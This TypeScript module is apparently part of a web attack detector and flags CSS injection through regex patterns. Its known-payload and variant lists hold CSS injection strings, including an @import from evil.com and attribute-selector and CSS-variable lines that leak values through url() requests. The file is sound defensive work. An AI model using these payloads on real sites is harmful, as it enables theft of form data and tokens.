/**
 * XSS — CSS Injection
 */
import type { InvariantClassModule, DetectionLevelResult } from '../types.js'
import { deepDecode } from '../encoding.js'
import { l2CssInjection } from '../../evaluators/l2-adapters.js'

const CSS_EXPRESSION_RE = /\bexpression\s*\(\s*[^)]{1,220}\)/i
const CSS_JS_DATA_URL_RE = /\burl\s*\(\s*['"]?\s*(?:javascript:|data:)[^)]{0,220}\)/i
const CSS_IMPORT_EXTERNAL_RE = /@import\s+(?:url\s*\(\s*['"]?\s*)?https?:\/\/[^'"\s)]+/i
const CSS_ATTR_EXFIL_RE = /\[[^\]]*(?:\^=|\$=|\*=|~=|\|=)[^\]]*\][\s\S]{0,220}?url\s*\(\s*['"]?[^)]*(?:\?|&)(?:leak|exfil|c|data)=/i
const CSS_BEHAVIOR_RE = /\bbehavior\s*:\s*url\s*\(/i
const CSS_VAR_EXFIL_RE = /--[a-z0-9_-]+\s*:\s*var\s*\(\s*--[a-z0-9_-]+\s*\)[\s\S]{0,220}?url\s*\(\s*[^)]*var\s*\(\s*--[a-z0-9_-]+\s*\)[^)]*\)/i

export const xssCssInjection: InvariantClassModule = {
    id: 'css_injection',
    description: 'Inject malicious stylesheet primitives to exfiltrate data or execute legacy browser code paths',
    category: 'xss',
    severity: 'high',
    calibration: { baseConfidence: 0.86 },

    mitre: ['T1059', 'T1185'],
    cwe: 'CWE-79',

    knownPayloads: [
        'width: expression(alert(1));',
        'background-image: url(javascript:void(0));',
        '@import url(https://evil.com/steal.css);',
        'input[value^=a] { background: url(?leak=a); }',
    ],

    knownBenign: [
        'color: red;',
        'background: url(logo.png);',
        'font-size: 16px; line-height: 1.4;',
        '.btn { padding: 8px 12px; }',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return (
            CSS_EXPRESSION_RE.test(d) ||
            CSS_JS_DATA_URL_RE.test(d) ||
            CSS_IMPORT_EXTERNAL_RE.test(d) ||
            CSS_ATTR_EXFIL_RE.test(d) ||
            CSS_BEHAVIOR_RE.test(d) ||
            CSS_VAR_EXFIL_RE.test(d)
        )
    },

    detectL2: (input: string): DetectionLevelResult | null => {
        const d = deepDecode(input)
        return l2CssInjection(d, d)
    },

    generateVariants: (count: number): string[] => {
        const variants = [
            'width: expression(alert(1));',
            'background: url(javascript:alert(1));',
            '@import url(https://evil.example/x.css);',
            'input[value^=a]{background:url(?leak=a)}',
            '--secret: var(--token); background: url(?c=var(--token));',
            'behavior: url(malware.htc);',
        ]
        const out: string[] = []
        for (let i = 0; i < count; i++) out.push(variants[i % variants.length])
        return out
    },
}
